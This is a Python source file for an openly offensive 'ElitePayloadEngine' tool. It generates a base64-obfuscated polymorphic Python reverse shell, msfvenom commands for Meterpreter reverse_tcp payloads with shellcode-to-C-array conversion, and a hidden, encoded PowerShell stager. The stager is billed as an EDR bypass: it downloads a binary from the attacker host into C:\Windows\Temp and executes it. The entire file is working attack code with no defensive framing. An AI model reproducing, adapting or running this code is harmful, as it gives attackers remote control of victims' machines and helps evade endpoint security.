import base64
import random
class ElitePayloadEngine:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
    def generate_polymorphic_python(self):
        junk_vars = ['_ghost_val_' + ''.join(random.choices('abcdef', k=6)) for _ in range(5)]
        raw_code = f"""import socket,os,subprocess
{junk_vars[0]} = '{self.lhost}'
{junk_vars[1]} = {self.lport}
{junk_vars[2]} = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
{junk_vars[2]}.connect(({junk_vars[0]},{junk_vars[1]}))
for {junk_vars[3]} in range(3):
    os.dup2({junk_vars[2]}.fileno(), {junk_vars[3]})
{junk_vars[4]} = subprocess.call(['/bin/sh','-i'])"""
        encoded = base64.b64encode(raw_code.encode()).decode()
        return f"import base64,sys; exec(base64.b64decode('{encoded}').decode())"
    def generate_raw_shellcode_command(self, arch="x64"):
        if arch == "x64":
            return f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f raw -o payload.bin"
        elif arch == "x86":
            return f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f raw -o payload.bin"
        elif arch == "linux":
            return f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f raw -o payload.bin"
        return ""
    def generate_c_array_shellcode(self, arch="x64"):
        raw_cmd = self.generate_raw_shellcode_command(arch)
        return f"# Run this on Kali to get C-Array shellcode:\n{raw_cmd} && hexdump -v -e '\"0x\" 1/1 \"%02x\" \", \"' payload.bin"
    def generate_edr_bypass_stager(self):
        ps_stager = f"$w=New-Object Net.WebClient;$u='http://{self.lhost}:{self.lport}/payload.bin';[System.IO.File]::WriteAllBytes('C:\\Windows\\Temp\\sys.exe',(New-Object Net.WebClient).DownloadData($u));Start-Process 'C:\\Windows\\Temp\\sys.exe'"
        encoded_stager = base64.b64encode(ps_stager.encode('utf-16le')).decode()
        return f"powershell -WindowStyle Hidden -NoP -NonI -EncodedCommand {encoded_stager}"
